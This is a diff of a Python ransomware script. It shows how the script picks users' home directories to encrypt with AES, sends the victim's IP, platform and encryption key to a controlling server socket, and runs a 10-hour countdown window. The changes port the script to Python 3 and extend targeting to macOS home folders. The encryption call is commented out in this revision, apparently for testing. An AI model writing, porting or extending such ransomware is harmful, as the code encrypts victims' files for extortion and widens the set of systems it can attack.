@@ -1,7 +1,12 @@
 #/usr/bin/env python
 import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time
-from Tkinter import *
-from ttk import *
+try:
+    from Tkinter import *
+    from ttk import *
+except ImportError:
+    from tkinter import *
+    from tkinter.ttk import *
+
 from Crypto import Random
 from Crypto.Cipher import AES
 
@@ -187,7 +192,6 @@ Zeznzo
             try:
                 s = 36000 # 10 hours
                 while s:
-                    #event = (datetime.datetime(day=11,month=6,year=2019, hour=18, minute=0)) - datetime.datetime.now()
                     min, sec = divmod(s, 60)
                     time_left = '{:02d}:{:02d}'.format(min, sec)
 
@@ -231,9 +235,8 @@ def encrypt_file(file_name, key):
 host = '127.0.0.1'
 port = 8989
 
-#key = hashlib.sha1(gen_string().encode('utf-8')).hexdigest()
-#print(len(key))
-key = hashlib.md5(gen_string()).hexdigest()
+key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
+
 global platform
 platform = platform.system()
 
@@ -247,12 +250,16 @@ def get_target():
     # Encrypt on this location
     # Users home on Linux
     if platform == 'Linux':
+        #target = '/home/' + getpass.getuser() + '/'
         target = '/home/' + getpass.getuser() + '/'
         return target
 
     # Users home on Windows
     elif platform == 'Windows':
         target = 'C:\\Users\\' + getpass.getuser() + '\\'
+        return target
+    elif platform == 'Darwin':
+        target = '/Users/' + getpass.getuser() + '/'
         return target
     else:
         sys.exit(1) # Cannot find users home directory, skip MacOS.
@@ -279,7 +286,7 @@ def connector():
         server.connect((host, port))
         server.send('%s$%s$%s' % (getlocalip(), platform, key))
 
-        start_encrypt(get_target(), key)
+        #start_encrypt(get_target(), key)
 
         main = mainwindow()
         main.mainloop()
